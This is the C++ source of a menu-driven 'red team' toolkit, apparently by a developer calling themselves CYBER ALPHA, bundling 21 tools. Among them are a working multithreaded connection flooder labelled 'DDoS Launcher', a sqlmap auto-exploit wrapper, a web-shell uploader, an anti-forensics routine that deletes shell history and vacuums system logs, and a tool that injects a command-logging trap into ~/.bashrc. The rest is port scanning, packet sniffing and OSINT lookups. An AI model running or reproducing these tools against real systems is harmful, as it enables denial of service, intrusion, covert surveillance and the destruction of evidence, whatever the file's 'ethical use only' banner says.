// main.cpp
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
#include <iostream>
#include <cstdlib>
#include <unistd.h>
#include <string>
#include <vector>
#include <set>
#include <sstream>
#include <fstream>
#include <regex>
#include <curl/curl.h>
#include <netdb.h>
#include <dlfcn.h>
#include <pcap.h>
#include <sys/stat.h>
#include <dirent.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <thread>
#include <openssl/aes.h>

#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define BLUE    "\033[34m"
#define CYAN    "\033[36m"
#define RESET   "\033[0m"

using namespace std;

void clear_screen() {
    system("clear");
}

void show_banner() {
    clear_screen();
    cout << GREEN;
    cout << " :::====  :::      :::====  :::  === :::====     \n";
    cout << " :::  === :::      :::  === :::  === :::  ===    \n";
    cout << " ======== ===      =======  ======== ========    \n";
    cout << " ===  === ===      ===      ===  === ===  ===    \n";
    cout << " ===  === ======== ===      ===  === ===  ===    \n";
    cout << CYAN << "       CYBER ALPHA — RED TEAM ASCII SUITE (21 Tools)\n";
    cout << CYAN << "       Stay Hidden. Stay Smart. Stay Ethical.\n" << RESET;
    cout << "=========================================================\n\n";
}



size_t curl_write(void *contents, size_t size, size_t nmemb, string *s) {
    size_t total = size * nmemb;
    s->append((char*)contents, total);
    return total;
}

string http_get(const string& url) {
    CURL* curl = curl_easy_init();
    string response;
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_write);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
    return response;
}

// TOOL 1
void tool_ip_tracer() {
    clear_screen(); show_banner();
    string ip;
    cout << CYAN << "[?] Enter IP Address: " << RESET;
    cin >> ip;
    string response = http_get("http://ip-api.com/line/" + ip);
    cout << GREEN << "\n[✓] IP Info:\n" << RESET;
    istringstream ss(response);
    string line;
    while (getline(ss, line)) cout << BLUE << " - " << RESET << line << endl;
}

// TOOL 2
void tool_subdomain_finder() {
    clear_screen(); show_banner();
    string domain;
    cout << CYAN << "[?] Enter domain: " << RESET; cin >> domain;
    vector<string> sublist = {"www", "mail", "ftp", "dev", "admin"};
    for (auto& sub : sublist) {
        string subdomain = sub + "." + domain;
        if (gethostbyname(subdomain.c_str())) {
            cout << GREEN << "[✓] Found: " << RESET << subdomain << endl;
        }
    }
}

// TOOL 3
void extract_links(const string& html, const string& base) {
    regex href("href=[\"']?([^\"'>]+)");
    smatch match;
    auto start = html.cbegin();
    while (regex_search(start, html.cend(), match, href)) {
        string link = match[1];
        if (link.find("http") == string::npos && link[0] != '/') link = base + "/" + link;
        cout << BLUE << "- " << RESET << link << endl;
        start = match.suffix().first;
    }
}
void tool_web_spider() {
    clear_screen(); show_banner();
    string url;
    cout << CYAN << "[?] Enter URL: " << RESET;
    cin >> url;
    extract_links(http_get(url), url);
}

// TOOL 4
void flood(string ip, int port, int dur) {
    time_t end = time(0) + dur;
    while (time(0) < end) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in target = {};
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        target.sin_addr.s_addr = inet_addr(ip.c_str());
        connect(sock, (sockaddr*)&target, sizeof(target));
        send(sock, "GET / CYBERALPHA\r\n", 18, 0);
        close(sock);
    }
}
void tool_ddos_launcher() {
    clear_screen(); show_banner();
    string ip; int port, threads, dur;
    cout << CYAN << "IP: " << RESET; cin >> ip;
    cout << CYAN << "Port: " << RESET; cin >> port;
    cout << CYAN << "Duration: " << RESET; cin >> dur;
    cout << CYAN << "Threads: " << RESET; cin >> threads;
    cout << GREEN << "[*] Attacking...\n" << RESET;
    vector<thread> t;
    for (int i = 0; i < threads; i++) t.emplace_back(flood, ip, port, dur);
    for (auto& x : t) x.join();
    cout << GREEN << "[✓] Done\n" << RESET;
}

// TOOL 5
void tool_sqli_auto_exploit() {
    clear_screen(); show_banner();
    string url;
    cout << CYAN << "Vuln URL: " << RESET; cin >> url;
    system(("sqlmap -u \"" + url + "\" --batch --dbs").c_str());
}

// TOOL 6
void tool_cve_auto_scanner() {
    clear_screen(); show_banner();
    string k; cout << CYAN << "Keyword: " << RESET; cin >> k;
    string html = http_get("https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=" + k);
    regex pat("CVE-\\d{4}-\\d{4,7}"); smatch m;
    auto start = html.cbegin(); set<string> found;
    while (regex_search(start, html.cend(), m, pat)) {
        found.insert(m[0]); start = m.suffix().first;
    }
    for (auto& c : found) cout << BLUE << "- " << RESET << c << endl;
}

// TOOL 7
void tool_username_scanner() {
    clear_screen(); show_banner();
    string user; cout << CYAN << "[?] Enter username: " << RESET; cin >> user;
    vector<string> urls = {
        "https://github.com/", "https://twitter.com/", "https://instagram.com/"
    };
    for (auto& u : urls) {
        string link = u + user;
        if (http_get(link).size() > 1000)
            cout << GREEN << "[✓] Found: " << RESET << link << endl;
    }
}

// TOOL 8
void tool_reverse_image_search() {
    clear_screen(); show_banner();
    string path; cout << CYAN << "[?] Image path: " << RESET; cin >> path;
    cout << GREEN << "\n[✓] Upload the image manually to:\nhttps://images.google.com\n" << RESET;
}

// TOOL 9
void tool_people_finder() {
    clear_screen(); show_banner();
    string name, city;
    cout << CYAN << "[?] Full Name: " << RESET; cin.ignore(); getline(cin, name);
    cout << CYAN << "[?] City: " << RESET; getline(cin, city);
    string query = regex_replace(name + " " + city, regex(" "), "+");
    cout << BLUE << "🔍 Google: https://www.google.com/search?q=" << query << RESET << endl;
}

// TOOL 10 (File Encryptor)
void encrypt_file(const string& in, const string& out, const string& key) {
    ifstream fin(in, ios::binary); ofstream fout(out, ios::binary);
    AES_KEY aes_key;
    AES_set_encrypt_key((const unsigned char*)key.c_str(), 128, &aes_key);
    char inbuf[16], outbuf[16];
    while (fin.read(inbuf, 16)) {
        AES_encrypt((unsigned char*)inbuf, (unsigned char*)outbuf, &aes_key);
        fout.write(outbuf, 16);
    }
}
void decrypt_file(const string& in, const string& out, const string& key) {
    ifstream fin(in, ios::binary); ofstream fout(out, ios::binary);
    AES_KEY aes_key;
    AES_set_decrypt_key((const unsigned char*)key.c_str(), 128, &aes_key);
    char inbuf[16], outbuf[16];
    while (fin.read(inbuf, 16)) {
        AES_decrypt((unsigned char*)inbuf, (unsigned char*)outbuf, &aes_key);
        fout.write(outbuf, 16);
    }
}
void tool_file_encryptor() {
    clear_screen(); show_banner();
    int opt; string in, out, key;
    cout << "[1] Encrypt\n[2] Decrypt\n> "; cin >> opt;
    cout << CYAN << "Input File: " << RESET; cin >> in;
    cout << CYAN << "Output File: " << RESET; cin >> out;
    cout << CYAN << "Key (16 char): " << RESET; cin >> key;
    if (opt == 1) encrypt_file(in, out, key); else decrypt_file(in, out, key);
}
// TOOL 11
void tool_anti_trace() {
    clear_screen(); show_banner();
    cout << GREEN << "[*] Cleaning history, DNS & logs...\n" << RESET;
    system("rm -rf ~/.bash_history");
    system("history -c");
    system("sudo systemd-resolve --flush-caches");
    system("sudo journalctl --rotate");
    system("sudo journalctl --vacuum-time=1s");
    cout << GREEN << "[✓] Traces cleaned." << RESET << endl;
}

// TOOL 12
void tool_firewall_manager() {
    clear_screen(); show_banner();
    int choice;
    cout << "[1] Enable UFW\n[2] Disable UFW\n[3] Status\n> ";
    cin >> choice;
    if (choice == 1) system("sudo ufw enable");
    else if (choice == 2) system("sudo ufw disable");
    else if (choice == 3) system("sudo ufw status");
}

// TOOL 13
void tool_shell_uploader() {
    clear_screen(); show_banner();
    string url, shell;
    cout << CYAN << "[?] Target Upload URL: " << RESET; cin >> url;
    cout << CYAN << "[?] Path to Shell File: " << RESET; cin >> shell;
    string cmd = "curl -F \"file=@" + shell + "\" " + url;
    system(cmd.c_str());
    cout << GREEN << "[✓] Upload attempt complete." << RESET << endl;
}

// TOOL 14
void tool_mac_changer() {
    clear_screen(); show_banner();
    string iface, newmac;
    cout << CYAN << "[?] Interface: " << RESET; cin >> iface;
    cout << CYAN << "[?] New MAC (blank=random): " << RESET;
    cin.ignore(); getline(cin, newmac);
    string cmd = "sudo ifconfig " + iface + " down && ";
    if (newmac.empty()) cmd += "sudo macchanger -r " + iface;
    else cmd += "sudo ifconfig " + iface + " hw ether " + newmac;
    cmd += " && sudo ifconfig " + iface + " up";
    system(cmd.c_str());
    cout << GREEN << "[✓] MAC address changed." << RESET << endl;
}

// TOOL 15
void tool_port_scanner() {
    clear_screen(); show_banner();
    string ip; int start, end;
    cout << CYAN << "Target IP: " << RESET; cin >> ip;
    cout << CYAN << "Start Port: " << RESET; cin >> start;
    cout << CYAN << "End Port: " << RESET; cin >> end;

    for (int port = start; port <= end; ++port) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in target = {};
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        target.sin_addr.s_addr = inet_addr(ip.c_str());
        timeval timeout = {1, 0};
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        if (connect(sock, (sockaddr*)&target, sizeof(target)) == 0)
            cout << GREEN << "[+] Open: " << RESET << port << endl;
        close(sock);
    }
}

// TOOL 16
void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    cout << GREEN << "[*] Packet captured: " << RESET << header->len << " bytes\n";
}

void tool_packet_sniffer() {
    clear_screen(); show_banner();
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *devs, *dev;

    if (pcap_findalldevs(&devs, errbuf) == -1) {
        cerr << RED << "[-] Error: " << errbuf << RESET << endl;
        return;
    }

    cout << BLUE << "Interfaces:\n" << RESET;
    int i = 0;
    for (dev = devs; dev; dev = dev->next)
        cout << " [" << ++i << "] " << dev->name << endl;

    int choice;
    cout << CYAN << "\nSelect Interface #: " << RESET; cin >> choice;

    dev = devs;
    for (int j = 1; j < choice && dev; ++j) dev = dev->next;
    if (!dev) return;
    string iface = dev->name;
    pcap_freealldevs(devs);

    pcap_t *handle = pcap_open_live(iface.c_str(), BUFSIZ, 1, 1000, errbuf);
    if (!handle) {
        cerr << RED << "[-] Cannot open device." << RESET << endl;
        return;
    }

    cout << GREEN << "[*] Listening on " << iface << "...\n" << RESET;
    pcap_loop(handle, 10, packet_handler, NULL);
    pcap_close(handle);
}

// TOOL 17
void tool_wordlist_generator() {
    clear_screen(); show_banner();
    string base; int min_len, max_len;
    cout << CYAN << "[?] Base word: " << RESET; cin >> base;
    cout << CYAN << "[?] Min length: " << RESET; cin >> min_len;
    cout << CYAN << "[?] Max length: " << RESET; cin >> max_len;
    ofstream fout("wordlist.txt");
    for (int len = min_len; len <= max_len; ++len)
        for (int i = 0; i < 100; ++i)
            fout << base << rand() % 10000 << "\n";
    fout.close();
    cout << GREEN << "[✓] Saved as wordlist.txt" << RESET << endl;
}

// TOOL 18
void find_hidden(const string& path) {
    DIR* dir = opendir(path.c_str());
    if (!dir) return;
    dirent* ent;
    while ((ent = readdir(dir)) != NULL) {
        string name = ent->d_name;
        if (name[0] == '.' && name != "." && name != "..")
            cout << BLUE << "[+] Hidden: " << RESET << name << endl;
    }
    closedir(dir);
}

void tool_hidden_file_finder() {
    clear_screen(); show_banner();
    string dir;
    cout << CYAN << "[?] Directory path: " << RESET;
    cin >> dir;
    find_hidden(dir);
}
// TOOL 19
void tool_process_monitor() {
    clear_screen(); show_banner();
    cout << GREEN << "[*] Top 10 Memory-Hogging Processes:\n" << RESET;
    system("ps aux --sort=-%mem | head -n 11");
}

// TOOL 20
void tool_bash_logger() {
    clear_screen(); show_banner();
    string logfile;
    cout << CYAN << "[?] Log file path: " << RESET;
    cin >> logfile;

    string cmd = "echo 'trap \"echo $(date): $(whoami): $(history 1) >> " + logfile + "\" DEBUG' >> ~/.bashrc";
    system(cmd.c_str());

    cout << GREEN << "[✓] Logging injected into ~/.bashrc" << RESET << endl;
}

// TOOL 21
void tool_developer_info() {
    clear_screen(); show_banner();
    cout << GREEN << "👤 Developer:     " << RESET << "CYBER ALPHA\n";
    cout << BLUE  << "📦 Tools:         " << RESET << "21 Heavy Red Team Tools (C++ CLI)\n";
    cout << CYAN  << "📞 Contact:       " << RESET << "@cyber_alpha_pk (Telegram)\n";
    cout << RED   << "🛡️  Use:           " << RESET << "Ethical hacking & Red Teaming ONLY\n";
    cout << BLUE  << "📍 Location:      " << RESET << "Pakistan 🇵🇰\n";
}

// ───────────────────── MENU ─────────────────────
void show_menu() {
    cout << CYAN << "[ Select a Tool to Launch ]\n" << RESET;
    cout << GREEN;
    cout << " [1]  🌐 IP Tracer\n";
    cout << " [2]  🔍 Subdomain Finder\n";
    cout << " [3]  🕷  Web Spider\n";
    cout << " [4]  💣 DDoS Launcher\n";
    cout << " [5]  💉 SQLi Auto Exploit\n";
    cout << " [6]  🧿 CVE Auto Scanner\n";
    cout << " [7]  🧩 Username Scanner\n";
    cout << " [8]  🔍 Reverse Image Search\n";
    cout << " [9]  🕵️ People Finder\n";
    cout << " [10] 🔐 File Encryptor\n";
    cout << " [11] 🧹 Anti-Trace Cleaner\n";
    cout << " [12] 🔥 Firewall Manager\n";
    cout << " [13] 🐚 Shell Uploader\n";
    cout << " [14] 🎭 MAC Changer\n";
    cout << " [15] 🔍 Port Scanner\n";
    cout << " [16] 📡 Packet Sniffer\n";
    cout << " [17] 🧰 Wordlist Generator\n";
    cout << " [18] 👁 Hidden File Finder\n";
    cout << " [19] 🧠 Process Monitor\n";
    cout << " [20] 🪓 Bash Logger\n";
    cout << " [21] 👤 Developer Info\n";
    cout << RED << " [0]  ❌ Exit\n" << RESET;
    cout << "================================================\n";
}

// ───────────────────── MAIN FUNCTION ─────────────────────
int main() {
    int choice;
    while (true) {
        clear_screen();
        show_banner();
        show_menu();

        cout << "\n> Enter option: ";
        cin >> choice;

        switch (choice) {
            case 1: tool_ip_tracer(); break;
            case 2: tool_subdomain_finder(); break;
            case 3: tool_web_spider(); break;
            case 4: tool_ddos_launcher(); break;
            case 5: tool_sqli_auto_exploit(); break;
            case 6: tool_cve_auto_scanner(); break;
            case 7: tool_username_scanner(); break;
            case 8: tool_reverse_image_search(); break;
            case 9: tool_people_finder(); break;
            case 10: tool_file_encryptor(); break;
            case 11: tool_anti_trace(); break;
            case 12: tool_firewall_manager(); break;
            case 13: tool_shell_uploader(); break;
            case 14: tool_mac_changer(); break;
            case 15: tool_port_scanner(); break;
            case 16: tool_packet_sniffer(); break;
            case 17: tool_wordlist_generator(); break;
            case 18: tool_hidden_file_finder(); break;
            case 19: tool_process_monitor(); break;
            case 20: tool_bash_logger(); break;
            case 21: tool_developer_info(); break;
            case 0:
                cout << GREEN << "\n[✓] Exiting... Stay Ethical. ✌️\n" << RESET;
                return 0;
            default:
                cout << RED << "[-] Invalid option. Try again.\n" << RESET;
                sleep(1);
                break;
        }

        cout << CYAN << "\n[↩] Press Enter to return to menu...";
        cin.ignore(); cin.get();
    }

    return 0;
}
